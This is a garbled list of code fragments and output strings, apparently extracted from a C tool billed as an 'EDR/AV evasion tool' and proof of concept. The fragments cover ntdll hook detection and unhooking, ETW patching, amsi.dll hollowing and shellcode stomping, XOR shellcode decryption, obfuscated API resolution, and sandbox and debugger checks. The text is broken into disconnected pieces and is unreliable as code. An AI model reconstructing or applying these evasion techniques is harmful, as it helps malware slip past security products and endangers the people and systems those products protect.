"( HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName "
"( HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect, DWORD nndPreferred "
"( HANDLE hProcess, PBOOL  pbDebuggerPresent "
"(!VirtualProtect(pHollowedDLL, 4096, PAGE_READWRITE, &dwOldProtection"
"(!VirtualProtect(pHollowedDLL, 4096, dwOldProtection, &dwOldProtection"
"("" (different from """
"("" NtAllocateVirtualMemory Hooked\n"""
"("" NtAllocateVirtualMemory Not Hooked"""
"("" NtAllocateVirtualMemory Not Hooked\n"""
"("" NtAllocateVirtualMemory is Hooked\n"""
"("" NtCreateThreadEx Not Hooked"""
"("" NtCreateThreadEx Not Hooked\n"""
"("" NtCreateThreadEx is Hooked\n"""
"("" NtProtectVirtualMemory Hooked\n"""
"("" NtProtectVirtualMemory Not Hooked"""
"("" NtProtectVirtualMemory Not Hooked\n"""
"("" NtProtectVirtualMemory is Hooked\n"""
"("" NtQueryInformationThread Hooked\n"""
"("" NtQueryInformationThread Not Hooked\n"""
"("""
"("", """
"(""0x%02x"", (unsigned char"
"(""0x%02x"", shellcode[i]"
"(""0x0 };"""
"(""Copy ntdll to a fresh memory allocation and overwrite calls adresses, Detecting ntdll hooking : \n"""
"(""Debugger is not attach"""
"(""ETW patched !"""
"(""Failed to converting protection to RW (%u"
"(""Failed to load required system functions."""
"(""Hit enter to run shellcode/payload without creating a new thread"""
"(""I got you sandbox, it's can't be run here :(\n"""
"(""NUMA memory allocate failed :( \n"""
"(""No hooked modules to unhook it!"""
"(""NtQueryInformationThread Not Hooked\n"""
"(""Original shellcode in hex format:\n"""
"(""Patching ETW 'Event Tracing for Windows' writer"""
"(""Restoring RX permission again"""
"(""Sandbox detected - Filename changed :( \n"""
"(""Sandbox rounds finished no sandbox detected ;"
"(""Shellcode & key Decrypted after stomping, Shellcode length: %d"", sizeof(shellcode"
"(""The nonexistent file is detected !!! trying to exit"""
"(""Try to find .text section, sec name %s"", (const char*"
"(""\\x%02x"", (unsigned char"
"(""\\x%02x"", currentByte"
"(""\\x%02x"", stub[i]"
"(""\n"""
"(""\nReversed shellcode:\n"""
"(""\n[+] Detecting hooks in new ntdll module\n"""
"(""\t"" GREEN "" [+]"" NC BOLD fmt NL NC, __VA_ARGS__"
"(""\t"" RED "" [!] "" NC BOLD fmt NL NC, __VA_ARGS__"
"(""\t"" RED "" [-] Author => Hossam Ehab / An EDR (End Point Detection & Response"
"(""\tFirst bytes are HOOKED : """
"(""amsi.dll .text address = 0x%p"", pHollowedDLL"
"(""converting protection to RW in ntdll"""
"(""failed to get a handle to %s\n"", lModuleName"
"(""moving the payload to the hollowed memory without using an APIs"""
"('{ ', end=''"
"(BLUE "" [*] "" NC BOLD fmt NL NC, __VA_ARGS__"
"(GREEN "" [+] "" NC BOLD fmt NL NC, __VA_ARGS__"
"(GREEN""			     Author => Hossam Ehab / EDR/AV evasion tool\n"""
"(GetModuleHandle(""kernel32.dll"""
"(HANDLE hFileMappingObject, DWORD  dwDesiredAccess, DWORD  dwFileOffsetHigh, DWORD  dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap"
"(HANDLE, IN OUT PVOID*, IN OUT PSIZE_T, IN ULONG, OUT PULONG"
"(HANDLE, PVOID, PVOID, ULONG, PULONG"
"(HANDLE, PVOID, ULONG, SIZE_T, ULONG, ULONG"
"(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow"
"(HMODULE hModule, LPCSTR lpProcName"
"(IN HANDLE ThreadHandle, IN THREADINFOCLASS ThreadInformationClass, OUT PVOID ThreadInformation, IN ULONG ThreadInformationLength, OUT PULONG         ReturnLength"
"(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile"
"(LPVOID, SIZE_T, DWORD, PDWORD"
"(OUT PHANDLE hThread, IN ACCESS_MASK DesiredAccess, IN PVOID ObjectAttributes, IN HANDLE ProcessHandle, IN PVOID lpStartAddress, IN PVOID lpParameter, IN ULONG Flags, IN SIZE_T StackZeroBits, IN SIZE_T SizeOfStackCommit, IN SIZE_T SizeOfStackReserve, OUT PVOID lpBytesBuffer"
"(RED""			88     88 88 88        88         88         88     88   \n"""
"(RED""			88   `8b. 88 88        88         88         88   `8b.   \n"""
"(RED""			88.d8' 88 88        88         88         88    `8b		 \n"""
"(RED""			88aaa8P'  88 88        88        a88aaaa    a88aaaa8P'   \n"""
"(RED""			dP     dP dP 88888888P 88888888P  88888888P  dP     dP   \n"""
"(RED""   	        	dP     dP dP dP        dP         88888888b  888888ba    \n"""
"(StrStrW(mystr, substr"
"(WCHAR substr[], WCHAR mystr[]"
"(b, SIZEOF(b"
"(cAmsi, SIZEOF(cAmsi"
"(cCheckGlobalMemory, SIZEOF(cCheckGlobalMemory"
"(cCheckRemote, SIZEOF(cCheckRemote"
"(cCreateFileA, SIZEOF(cCreateFileA"
"(cCreateFileMapping, SIZEOF(cCreateFileMapping"
"(cEtwEventWrite, SIZEOF(cEtwEventWrite"
"(cGetCurrentProcess, SIZEOF(cGetCurrentProcess"
"(cLib2Name, SIZEOF(cLib2Name"
"(cMapViewOfFile, SIZEOF(cMapViewOfFile"
"(cNtAllocateVirtualMemory, SIZEOF(cNtAllocateVirtualMemory"
"(cNtCreateThreadEx, SIZEOF(cNtCreateThreadEx"
"(cNtProtectVirtualMemory, SIZEOF(cNtProtectVirtualMemory"
"(cNtQueryInformationThread, SIZEOF(cNtQueryInformationThread"
"(cNtWriteVirtualMemory, SIZEOF(cNtWriteVirtualMemory"
"(cNtdll, SIZEOF(cNtdll"
"(cVirtualAllocExNuma, SIZEOF(cVirtualAllocExNuma"
"(char* cApi, int nSize"
"(cmpUnicodeStr(substr, mystr"
"(decKey, SIZEOF(decKey"
"(fmt, ..."
"(hModuleK, b"
"(hModuleK, cCheckGlobalMemory"
"(hModuleK, cCheckRemote"
"(hModuleK, cCreateFileA"
"(hModuleK, cCreateFileMapping"
"(hModuleK, cGetCurrentProcess"
"(hModuleK, cMapViewOfFile"
"(hNtdll, cNtAllocateVirtualMemory"
"(hNtdll, cNtCreateThreadEx"
"(hNtdll, cNtProtectVirtualMemory"
"(hNtdll, cNtQueryInformationThread"
"(hNtdll, cNtWriteVirtualMemory"
"(hOut, &dwMode"
"(hOut, dwMode"
"(int argc, char** argv"
"(int idx = 0, ctr = 0; idx < shellcode_len; idx++"
"(lib, ""Shlwapi.lib"""
"(memcmp(addr, stub, 4"
"(mystr, 0, MAX_PATH * sizeof(WCHAR"
"(mystr, MAX_PATH"
"(mystr, MAX_PATH, pEntry->FullDllName.Buffer"
"(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL"
"(ntdllMapping, FILE_MAP_READ, 0, 0, 0"
"(pCreateFileAFunc(cLib2Name, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_READONLY, NULL"
"(pHollowedDLL, shellcode, sizeof(shellcode"
"(pHollowedDLL, sizeof(shellcode"
"(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL"
"(process, ntdllModule, &mi, sizeof(mi"
"(shellcode, size"
"(strcmp(lpProcName, (const char*"
"(strstr(argv[0], ""killer.exe"""
"(substr, 0, MAX_PATH * sizeof(WCHAR"
"(substr, MAX_PATH"
"(substr, MAX_PATH, lModuleName"
"(unsigned char *shellcode, int size"
"(wtext, cNtdll, strlen(cNtdll"
"(wtk, cLib2Name, strlen(cLib2Name"
( LPMEMORYSTATUSEX lpBuffer
(!(pMem = (char*
(!(pVirtualProtectFunc && pCreateFileAFunc && pGetCurrentProcessFunc &&  pCheckRemoteDebuggerPresentFunc && pCreateFileMappingAFunc && pGlobalMemoryStatusExFunc && pMapViewOfFileFunc
(!pCheckRemoteDebuggerPresentFunc(pGetCurrentProcessFunc(
(!strcmp((char*
(&ms
(&s
((BYTE*
((DWORD_PTR
((LOCALE_ENUMPROCA
((LPVOID
()
(*funcPtr
(0x30
(0x60
(0x90 or 0x40 or 0x30
(CheckRemoteDebuggerPresentFunc
(CreateFileAFunc
(CreateFileMappingAFunc
(DWORD i = 0; i < exportDirectory->NumberOfNames; ++i
(DWORD*
(DWORD_PTR
(EDR Evasion
(FARPROC
(Functions - Keys - Shellcode
(GetCurrentProcessFunc
(GlobalMemoryStatusExFunc
(HMODULE
(LDR_DATA_TABLE_ENTRY*
(LIST_ENTRY
(LIST_ENTRY* pListEntry = pStartListEntry; pListEntry != ModuleList; pListEntry = pListEntry->Flink
(LPCWSTR lModuleName
(LPVOID
(LPVOID addr
(MapViewOfFileFunc
(NTAPI* uNtAllocateVirtualMemory
(NTAPI* uNtCreateThreadEx
(NTAPI* uNtProtectVirtualMemory
(NTAPI* uNtQueryInformationThread
(NTAPI* uNtWriteVirtualMemory
(PEB *
(PEB*
(PIMAGE_DOS_HEADER
(PIMAGE_EXPORT_DIRECTORY
(PIMAGE_NT_HEADERS
(PIMAGE_SECTION_HEADER
(PSIZE_T
(PULONG
(PVOID
(PVOID*
(Proof-of-Concept
(STD_OUTPUT_HANDLE
(VirtualProtectFunc
(WINAPI * CheckRemoteDebuggerPresentFunc
(WINAPI * CreateFileMappingAFunc
(WINAPI * GlobalMemoryStatusExFunc
(WINAPI * MapViewOfFileFunc
(WINAPI* CreateFileAFunc
(WINAPI* GetCurrentProcessFunc
(WINAPI* VirtualProtectFunc
(WINAPI* pVirtualAllocExNuma
(WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++
(WORD*
(after stomping
(cAmsi
(cApi[i] != 0 && cApi[i] != KEY
(char*
(checkNUMA(
(checkResources(
(ctr == keysize
(decKey
(etwPatch
(hModuleK != NULL
(hex(i ^ key
(hookedNtHeader
(https://github.com/abdallah-elsharif
(https://user-images.githubusercontent.com/82971998/230731975-a70abd1c-279b-4e79-9e91-6b5212b7db9a.png
(https://user-images.githubusercontent.com/82971998/230732045-ca2638fe-4f3c-4926-8f94-4fff817ca585.png
(i != size-1
(i = 0; i < size/2; i++
(int i = 0; i < 4; i++
(int i = 0; i < nSize; i++
(int i = 0; i < size; i++
(int i = 0; i < sizeof(shellcode
(int idx = 0; idx < nMemAlloc; idx++
(isItHooked(myGetProcAddr(myGetModuleHandle(wNtdll
(mem != NULL
(ms
(myGetModuleHandle(wNtdll
(nMemAlloc
(nMemAlloc != nCtr
(nbHooks > 0
(pGetCurrentProcessFunc(
(pHollowedDLL
(pMem
(pNtHeaders
(pVirtualAllocExNuma
(procNum < 2
(ram < 2
(shellcode
(shellcode[0]
(size % 2 != 0
(strncmp((const char*
(success
(uNtAllocateVirtualMemory
(uNtCreateThreadEx
(uNtProtectVirtualMemory
(uNtQueryInformationThread
(uNtWriteVirtualMemory
(unsigned char*
(unsigned char* pEnctyptedShell
(void
(void (*
(wNtdll
(wcLib2dll
(which represents the DLL
(x
